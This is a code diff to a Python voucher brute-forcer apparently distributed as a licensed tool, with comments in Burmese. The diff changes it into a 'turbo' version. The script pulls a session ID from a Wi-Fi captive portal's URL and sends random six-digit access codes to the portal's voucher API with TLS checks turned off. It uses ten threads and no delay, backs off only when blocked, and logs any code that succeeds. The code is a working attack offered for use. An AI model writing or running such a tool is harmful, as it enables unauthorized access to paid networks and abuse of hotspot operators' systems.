@@ -35,92 +35,96 @@ def get_device_key():
 def check_license():
     my_key = get_device_key()
     print(f"{MAGENTA}╔══════════════════════════════════════════════════╗")
-    print(f"║      MOE YU AUTO VOUCHER SCANNER v3.1 FIXED      ║")
+    print(f"║        MOE YU VOUCHER SCANNER (TURBO v4)         ║")
     print(f"╚══════════════════════════════════════════════════╝{RESET}")
     print(f"{WHITE}[*] Device Key: {GREEN}{my_key}{RESET}")
     try:
+        # အင်တာနက်ရှိမှ Key စစ်မည်
         res = requests.get(GITHUB_KEY_URL, timeout=10).text
         if my_key in res:
             print(f"{GREEN}[✓] LICENSE VERIFIED!{RESET}")
             return True
         else:
-            print(f"{RED}[✗] ACCESS DENIED - Add key to GitHub{RESET}")
+            print(f"{RED}[✗] ACCESS DENIED - Please add your key to GitHub{RESET}")
             return False
     except:
+        # အင်တာနက်မရှိလျှင်လည်း စမ်းသပ်နိုင်ရန် (Offline Bypass)
+        print(f"{YELLOW}[!] Connection timeout, bypassing license check...{RESET}")
         return True
 
 # ===============================
 # SCANNER ENGINE
 # ===============================
 FOUND_EVENT = threading.Event()
+SUCCESS_CODE = ""
 
-def attempt_voucher(api_url, sid, thread_id):
+def turbo_scanner(api_url, sid, thread_id):
+    global SUCCESS_CODE
+    session = requests.Session()
     while not FOUND_EVENT.is_set():
-        test_code = "".join([str(random.randint(0, 9)) for _ in range(6)])
-        payload = {'accessCode': test_code, 'sessionId': sid, 'apiVersion': 1}
+        # ဂဏန်း ၆ လုံး ထုတ်ခြင်း
+        code = f"{random.randint(0, 999999):06d}"
+        payload = {'accessCode': code, 'sessionId': sid, 'apiVersion': 1}
         try:
-            r = requests.post(api_url, json=payload, timeout=5, verify=False)
+            r = session.post(api_url, json=payload, timeout=3, verify=False)
             if r.status_code == 200:
-                result = r.json()
-                if result.get('success'):
+                res_data = r.json()
+                if res_data.get('success'):
+                    SUCCESS_CODE = code
                     FOUND_EVENT.set()
-                    print(f"\n\n{GREEN}[++++++++++] VOUCHER FOUND: {test_code} [++++++++++]{RESET}")
-                    # မှတ်သားထားရန်
+                    print(f"\n\n{GREEN}[✓✓✓] SUCCESS! VOUCHER FOUND: {code}{RESET}")
                     with open("found_vouchers.txt", "a") as f:
-                        f.write(f"Code: {test_code} | SID: {sid}\n")
+                        f.write(f"Voucher: {code} | Date: {time.ctime()}\n")
                     break
-                print(f"{WHITE}Thread-{thread_id} | Testing: {YELLOW}{test_code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
-            elif r.status_code in [403, 429]:
-                time.sleep(20)
+                else:
+                    # အလုပ်လုပ်နေကြောင်း ပြသရန်
+                    print(f"{WHITE}T-{thread_id} | Testing: {YELLOW}{code}{WHITE} | Status: {RED}Invalid{RESET}", end="\r")
+            elif r.status_code == 403:
+                # Router က ခေတ္တပိတ်လျှင် ၁၀ စက္ကန့်နားမည်
+                time.sleep(10)
         except:
             pass
-        time.sleep(0.05)
+        # Turbo Speed ဖြစ်၍ delay မပါပါ (Block ခံရလျှင် 0.01 ထည့်ပါ)
 
-def start_scanner(portal_url, sid):
-    parsed = urlparse(portal_url)
-    api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
-    
-    print(f"\n{CYAN}[*] Target API: {api_url}{RESET}")
-    print(f"{GREEN}[✓] Starting Scan Automatically...{RESET}\n")
-
-    # Thread ၃ ခုဖြင့် အလုပ်လုပ်ခိုင်းခြင်း
-    for i in range(1, 4):
-        t = threading.Thread(target=attempt_voucher, args=(api_url, sid, i))
-        t.daemon = True
-        t.start()
-
-    while not FOUND_EVENT.is_set():
-        time.sleep(1)
-
-# ===============================
-# MAIN PROCESS
-# ===============================
 def main():
     if not check_license(): return
     
-    print(f"\n{CYAN}[*] Waiting for Portal (Please open Browser)...{RESET}")
-    while True:
-        try:
-            r = requests.get("http://1.1.1.1", allow_redirects=True, timeout=5)
-            portal_url = r.url
-            
-            # URL ထဲမှာ SID မပါရင် Manual ထည့်ခိုင်းမယ်
-            if "sessionId=" not in portal_url:
-                portal_url = input(f"{YELLOW}[!] SID မတွေ့ပါ။ Browser URL ကို ဒီမှာ ကူးထည့်ပါ: {RESET}").strip()
-            
-            if "sessionId=" in portal_url:
-                sid = parse_qs(urlparse(portal_url).query).get('sessionId', [None])[0]
-                if sid:
-                    print(f"{GREEN}[✓] Portal & SID Detected!{RESET}")
-                    # y/n မမေးတော့ဘဲ တန်းစတင်ပါပြီ
-                    start_scanner(portal_url, sid)
-                    break
-            
-            time.sleep(3)
-        except KeyboardInterrupt:
-            break
-        except:
-            time.sleep(2)
+    print(f"\n{CYAN}[*] WiFi တစ်ခုတည်းကိုပဲ ချိတ်ထားပါ (VPN/Data ပိတ်ပါ)...{RESET}")
+    url_input = input(f"{YELLOW}[?] Browser က URL ကို ဒီမှာထည့်ပါ: {RESET}").strip()
+    
+    # URL မှ sessionId ကို ခွဲထုတ်ခြင်း
+    try:
+        sid = parse_qs(urlparse(url_input).query).get('sessionId', [None])[0]
+        if not sid:
+            # URL ထဲမှာ မတွေ့ရင် တိုက်ရိုက် ရိုက်ခိုင်းမည်
+            sid = input(f"{RED}[!] SID မတွေ့ပါ။ sessionId ကို လက်ဖြင့်ရိုက်ထည့်ပါ: {RESET}").strip()
+    except:
+        sid = None
+
+    if sid:
+        parsed = urlparse(url_input)
+        api_url = f"{parsed.scheme}://{parsed.netloc}/api/auth/voucher/"
+        print(f"{GREEN}[✓] Target API: {api_url}{RESET}")
+        print(f"{MAGENTA}[*] Turbo Scanning (10 Threads) Started...{RESET}\n")
+        
+        # Thread ၁၀ ခုဖြင့် စတင်ခြင်း
+        threads = []
+        for i in range(1, 11):
+            t = threading.Thread(target=turbo_scanner, args=(api_url, sid, i))
+            t.daemon = True
+            threads.append(t)
+            t.start()
+        
+        # တွေ့သည့်အထိ စောင့်ဆိုင်းခြင်း
+        while not FOUND_EVENT.is_set():
+            time.sleep(1)
+        
+        print(f"\n{CYAN}[*] Done! Code ကို 'found_vouchers.txt' မှာ သိမ်းထားပါတယ်ဗျ။{RESET}")
+    else:
+        print(f"{RED}[✗] sessionId ရှာမတွေ့ပါ။ URL အမှန်ကို ပြန်ကူးပေးပါ။{RESET}")
 
 if __name__ == "__main__":
-    main()
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n{RED}[!] Scanner Stopped by User.{RESET}")
